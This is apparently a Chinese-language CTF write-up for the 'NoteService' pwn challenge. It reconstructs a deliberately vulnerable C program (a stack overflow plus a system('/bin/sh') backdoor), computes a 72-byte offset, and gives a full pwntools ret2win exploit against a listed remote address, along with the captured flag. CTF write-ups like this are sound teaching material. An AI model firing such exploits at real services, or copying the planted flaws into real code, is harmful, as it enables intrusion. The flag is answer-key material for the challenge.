# vuln2 WP

## 题目信息

- 目标地址：`120.27.146.76:19574`
- 附件：`./vuln2/2026-线上-网络安全/PWN-最新/PWN/PWN-NoteService/PWN附件/vuln`
- 配套库：`./vuln2/2026-线上-网络安全/PWN-最新/PWN/PWN-NoteService/PWN附件/libc-2.31.so`
- 最终拿到的远程 flag：`flag{b8604a81cf1196b752f8704fff71c0f2}`

## 题目分析

先对附件做基本检查：

- `64-bit ELF`
- `No PIE`
- `No canary`
- `NX enabled`
- `Partial RELRO`

这类题如果程序内部还带有现成后门函数，通常就是非常典型的 `ret2win`。

### 1. 程序核心逻辑

从反汇编可以很容易还原出关键函数：

```c
void secret_note() {
    system("/bin/sh");
}

void vuln() {
    char buf[0x40];

    puts("=== Note Service ===");
    puts("Leave your note:");
    read(0, buf, 0x100);
    puts("Note saved. Thank you!");
}
```

这里漏洞点非常明显：

- `buf` 只有 `0x40` 字节
- `read()` 却读了 `0x100` 字节
- 存在标准栈溢出

### 2. 后门函数

程序中自带后门函数 `secret_note()`：

```text
secret_note = 0x401196
```

该函数内部直接执行：

```c
system("/bin/sh");
```

同时程序里还存在 `/bin/sh` 字符串：

```text
"/bin/sh" = 0x402004
```

因此利用思路非常直接，只要办法把返回地址改成 `secret_note()` 即可拿到 shell。

### 3. 偏移计算

`vuln()` 的栈布局很简单：

```text
rbp-0x40 ~ rbp-0x01 : buf[0x40]
rbp+0x00            : saved rbp
rbp+0x08            : return address
```

所以从 `buf` 开始覆盖到返回地址的偏移是：

```text
0x40 + 0x8 = 0x48
```

也就是：

```python
offset = 72
```

## 利用思路

利用链非常短：

1. 向 `read()` 输入超长数据
2. 覆盖 `vuln()` 返回地址
3. 跳转到 `secret_note()`
4. 获得 `/bin/sh`
5. 执行 `cat /flag`

### 为什么要补一个 `ret`

64 位程序里要考虑栈对齐问题。虽然这是个很短的 `ret2win`，但为了让 `system()` 更稳定，最好在跳 `secret_note()` 前先补一个单独的 `ret`。

我这里使用的 gadget：

```text
ret = 0x40101a
secret_note = 0x401196
```

因此最终 payload 为：

```python
payload = b"A" * 72 + p64(0x40101a) + p64(0x401196)
```

## 远程利用过程

连远程后，直接把 payload 发给 `Leave your note:` 对应的输入点，程序返回后就会进入 `system("/bin/sh")`。

随后执行：

```sh
cat /flag
```

即可得到远程 flag。

这里我在远程上还顺手验证了一下目录内容，发现根目录下明确存在 `/flag` 文件，所以直接读取这个路径就行。

## 复现脚本

下面是我打远程时使用的 `pwntools` 脚本：

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "120.27.146.76"
PORT = 19574

ret = 0x40101a
secret_note = 0x401196
payload = b"A" * 72 + p64(ret) + p64(secret_note)

io = remote(HOST, PORT)
io.recvuntil(b"Leave your note:\n")
io.sendline(payload)

sleep(0.2)
io.sendline(b"cat /flag")

io.interactive()
```

运行后可以直接读到：

```text
flag{b8604a81cf1196b752f8704fff71c0f2}
```

## 总结

本题就是一道非常标准的栈溢出基础题，核心点只有两个：

- `read(0, buf, 0x100)` 对 `0x40` 栈缓冲区造成溢出
- 程序内已经准备好了 `secret_note()`，可直接 `system("/bin/sh")`

由于：

- 没有 canary
- 没有 PIE
- 后门函数现成可用

所以最直接的利用方式就是 `ret2win`。

最终 flag：

```text
flag{b8604a81cf1196b752f8704fff71c0f2}
```
